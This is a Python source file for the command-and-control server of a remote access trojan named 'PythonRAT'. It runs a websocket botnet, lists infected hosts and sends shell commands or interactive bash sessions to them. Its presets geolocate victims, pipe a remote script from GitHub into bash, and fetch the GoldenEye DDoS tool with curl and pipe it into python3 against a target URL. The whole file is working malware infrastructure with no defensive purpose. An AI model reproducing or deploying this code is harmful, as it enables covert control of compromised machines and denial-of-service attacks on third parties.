import click
import hashlib
import logging
import asyncio
import logging
import termcolor
import websockets


from typing import List, Union
from prettytable import PrettyTable
from websockets.exceptions import ConnectionClosedError
from websockets.server import WebSocketServerProtocol as WebSocketConn



logger = logging.getLogger(__name__)

CLI_OPTIONS  = f'{termcolor.colored("Enter:","red")}\n'
CLI_OPTIONS += f'* "{termcolor.colored("0","yellow",attrs=["bold"])}" {termcolor.colored("- to print bot clients collection","red")}\n'
CLI_OPTIONS += f'* {termcolor.colored("Indexes of clients separated by space to send bash command to","red")}\n'
CLI_OPTIONS += f'* {termcolor.colored("Index of one client to jump into bash (send","red")} "{termcolor.colored("exit","yellow",attrs=["bold"])}" {termcolor.colored("for termination)","red")}\n'
CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("all", "yellow",attrs=["bold"])}" {termcolor.colored("to send a single command for each bot","red")}\n'

FUN_BANNER = termcolor.colored('''

        _        PythonRAT        _
       |_|                       |_|
       | |         /^^^\         | |
      _| |_      (| "o" |)      _| |_
    _| | | | _    (_---_)    _ | | | |_
   | | | | |' |    _| |_    | `| | | | |
   |          |   /     \   |          |
    \        /  / /(. .)\ \  \        /
      \    /  / /  | . |  \ \  \    /
        \  \/ /    ||v||    \ \/  /
         \__/      || ||      \__/
                   () ()
                   || ||
                  ooO Ooo  ''','green',attrs=["bold"])



class Utils:
    def hash_sha256(password: str) -> str:
        return hashlib.sha256(bytes(password, encoding='utf-8')).hexdigest()

    def is_num(x: str):
        try:
            return isinstance(int(x), int)
        except Exception:
            return False

    def configure_logging():
        logging.basicConfig()
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('websockets').setLevel(logging.ERROR)
        logging.getLogger('asyncio').setLevel(logging.ERROR)

    


class Bot:
    def __init__(self,
                 idx: int,
                 remote_address: str,
                 ws: WebSocketConn,
                 user: str):
        self.idx = idx
        self.remote_address = remote_address
        self.ws = ws
        self.user = user

    def __str__(self):
        return f"Bot {self.remote_address}, user: {self.user}"

    async def send_command(self, command: str):
        try:
            await self.ws.send(command)
            return await self.ws.recv()
        except (ConnectionClosedError,RuntimeError,ConnectionClosedOK):
            return False



class Context:
    def __init__(self, plain_password: str):
        self.pass_hash = Utils.hash_sha256(plain_password)
        self.bots: List[Bot] = []

    def isNotListed(self, ip: str, ip_list: Bot) -> bool:
        for listed_ip in ip_list:
            if ip in str(listed_ip):
                #print(f'Type listed_ip : {type(str(listed_ip))}')
                #print(f'IP déjà listée : {ip} --->  {listed_ip}')
                return False
        return True

    def get_bot(self, idx: int) -> Union[Bot, None]:
        try:
            return list(filter(lambda x: x.idx == idx, self.bots))[0]
        except Exception:
            return None


    async def add_bot(self, ws: WebSocketConn) -> Bot:
        # First the client sends logged in user
        user = await ws.recv()
        try:
            id = None
            remote_adr, _ = ws.remote_address
            new_bot = Bot(
                id,
                remote_adr,
                ws,
                user.strip("\n") if user else "N/A"
            )
            if self.isNotListed(new_bot.remote_address, self.bots):
                self.bots.append(new_bot)
                logger.info(f"Added {new_bot}")
                new_bot.idx = self.bots.index(new_bot) + 1
                print(f'Longueur liste bot : {len(self.bots)}')
                #print(f"self.bots[0] : {self.bots[0]}")
                #print(f"self.bots : {self.bots}")
                #print(f'new_bot : {new_bot}')
                #print(f'new_bot.remote_address : {new_bot.remote_address}')
                #print(f"self.bots[0].__str__ : {self.bots[0].__str__}")
                #print(f'self.bots[0].remote_address : {self.bots[0].remote_address}')
                return new_bot

        except Exception as e:
            logger.error(f"Exception {e} during adding new bot client")
            return None

    def remove_bot_client(self, bot: Bot):
        if bot in self.bots:
            self.bots.remove(bot)
            logger.info(f"{bot} removed")
            logger.info(f"Bots : {len(self.bots)}")
        for bot in self.bots:
            bot.idx = self.bots.index(bot) + 1

    def get_database_summary(self) -> str:
        global FUN_BANNER
        list_bot = []
        bot_len = len(self.bots)
        x = PrettyTable()
        x.field_names = [termcolor.colored("Index","yellow",attrs=["bold"]), termcolor.colored("Remote address","yellow",attrs=["bold"]), termcolor.colored("Logged as","yellow",attrs=["bold"])]
        for bot in self.bots:
            x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
        return f'\n{FUN_BANNER}\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'

    def getLenBots(self):
        return len(self.bots)

class CommandControl:
    def __init__(self, ctx: Context):
        self.ctx = ctx

    async def optionalCommands(self, cmd: str, ws : WebSocketConn) -> str:
        match cmd:
            case "city":
                return "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
            case "neofetch":
                return "(curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch)"
            case "ddos":
                await ws.send(f'\n {termcolor.colored("Which URL ? > ","yellow",attrs=["bold"])}')
                url = await ws.recv()
                return f"curl -fsSL https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py | python3 - {url} || echo test"
            case default:
                return cmd


    async def bot_authenticated(self, ws: WebSocketConn) -> str:
        pass_hash = await ws.recv()
        return pass_hash == self.ctx.pass_hash

    async def handle_bot(self, ws: WebSocketConn, _: str):
        try:
            if not await self.bot_authenticated(ws):
                logger.info(f"Bot client {ws.remote_address} not authenticated")
                await ws.close()
                return
            bot = await self.ctx.add_bot(ws)
            if bot:
                await ws.keepalive_ping()
                self.ctx.remove_bot_client(bot)
        except (websockets.exceptions.ConnectionClosedOK,websockets.exceptions.ConnectionClosedError,OSError):
            pass

    async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
        CLI_OPTIONS  = f'\n* {termcolor.colored("Send:","red")}'
        CLI_OPTIONS += f'\n* "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}'
        CLI_OPTIONS += f'\n* "{termcolor.colored("neofetch", "yellow",attrs=["bold"])}" {termcolor.colored("to see a fancy terminal UwU","red")}'
        CLI_OPTIONS += f'\n* "{termcolor.colored("ddos", "yellow",attrs=["bold"])}" {termcolor.colored("to ddos a website (be careful [ Goldeneye DDOS Tool ])","red")}'
        CLI_OPTIONS += f'\n* {termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
        await ws.send(CLI_OPTIONS)
        cmd = await ws.recv()
        cmd = await self.optionalCommands(cmd, ws)
        async def exec_command(bot_idx: int):
            cur_bot = self.ctx.get_bot(bot_idx)
            if not cur_bot:
                #await ws.send(f"Bot {bot_idx} does not exist")
                return

            stdout = await cur_bot.send_command(cmd)
            if stdout is False:
                self.ctx.remove_bot_client(cur_bot)
                await ws.send(f"Connection with bot {cur_bot} was closed...")
            else:
                stdout = f"{termcolor.colored('Bot','cyan',attrs=['bold'])} {termcolor.colored(bot_idx,'yellow',attrs=['bold'])} :\n {termcolor.colored(stdout,'green',attrs=['bold'])}"
                await ws.send(stdout)

        # Execute all commands simultaneously in case it takes long time to
        # finish
        try:
            await asyncio.gather(*[exec_command(i) for i in idxs])
        except OSError:
            pass

    async def start_bash(self, ws: WebSocketConn, bot_idx: int):
        bot = self.ctx.get_bot(bot_idx)
        if not bot:
            #await ws.send(f"Bot {bot_idx} does not exist")
            return

        while True:
            cmd = await ws.recv()
            if cmd.strip("\n").lower() == "exit":
                break
            else:
                await self.optionalCommands(cmd, ws)
            stdout = await bot.send_command(cmd)
            if ws.closed or stdout is False:
                self.ctx.remove_bot_client(bot)
                await ws.send(f"Connection with bot {bot.idx} was closed...")
                break

            await ws.send(termcolor.colored(stdout, 'green',attrs=['bold']))

    async def handle_cli(self, cli_ws: WebSocketConn, _: str):
        logger.info("Command and control connection established")
        try:
            while True:
                await cli_ws.send(termcolor.colored(CLI_OPTIONS,'red'))

                # To not care about empty lines
                choice = None
                while not choice:
                    choice = (await cli_ws.recv())

                if choice == "0":
                    await cli_ws.send(self.ctx.get_database_summary())

                # Validate the input
                nums = choice.split(" ")
                print(f'nums : {nums}')
                if 'all' in nums or '*' in nums:
                    nums = list(range(1, self.ctx.getLenBots() + 1))
                    await self.execute_commands(cli_ws, [int(x) for x in nums])
                    continue
                elif any(filter(lambda x: not Utils.is_num(x), nums)):
                    await cli_ws.send("Unknown input")
                    continue
                # Start bash with this client
                elif len(nums) == 1 and nums[0]:
                    await self.start_bash(cli_ws, int(nums[0]))
                    continue
                # Execute commands
                await self.execute_commands(cli_ws, [int(x) for x in nums])
        except ConnectionClosedError:
            logger.info("Command and control connection closed")


@click.command()
@click.option(
    "--cac_port",
    "-cp",
    type=click.INT,
    default=4444,
    help="Port where command and control center listens",
)
@click.option(
    "--bot_port",
    "-bp",
    type=click.INT,
    default=9000,
    help="Port where bots should connect in order to join the botnet",
)
@click.option(
    "--secret_password",
    "-s",
    default="password",
    help="Password needed for bots to connect",
)
@click.option(
    "--ip_address",
    "-i",
    default="0.0.0.0",
    help="Ip address for server to listen on",
)
def main(cac_port: int, bot_port: int, ip_address: str, secret_password: str):
    Utils.configure_logging()
    ctx = Context(secret_password)
    cac = CommandControl(ctx)

    bot_clients_server = websockets.serve(cac.handle_bot, ip_address, bot_port)
    control_server = websockets.serve(cac.handle_cli, ip_address, cac_port)

    logger.info(f"Starting bot client server on {ip_address}:{bot_port}")
    asyncio.get_event_loop().run_until_complete(bot_clients_server)

    logger.info(f"Starting control server on {ip_address}:{cac_port}")
    asyncio.get_event_loop().run_until_complete(control_server)
    asyncio.get_event_loop().run_forever()


if __name__ == "__main__":
    main()
